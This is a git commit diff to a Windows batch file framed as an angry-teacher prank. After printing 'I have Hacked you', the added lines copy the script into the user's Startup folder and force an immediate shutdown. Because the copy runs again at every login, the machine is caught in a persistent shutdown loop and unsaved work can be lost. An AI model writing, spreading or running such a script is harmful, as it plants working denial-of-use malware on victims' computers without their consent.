89142cf962923e7f4dea64b6e715e766fe6ab32b
RealSkyskysun <geniuswang2234@gmail.com>
2024-05-21 08:59:59 +1200

    Update veryangryenglishteacher.bat

--- veryangryenglishteacher.bat
+++ veryangryenglishteacher.bat
@@ -14,4 +14,18 @@ echo you have angered me more...
 echo I have Hacked you
 echo Your Windows computer will crash in 10 seconds
 timeout 10
-shutdown -s -t 1
+@echo off
+
+rem Get the path to the current script
+set "script_path=%~dp0"
+set "script_name=%~nx0"
+
+rem Set the destination path to the Startup folder
+set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+rem Copy the script to the Startup folder
+copy "%script_path%%script_name%" "%startup_folder%" > nul
+
+rem Shutdown the computer
+shutdown /s /f /t 0
+
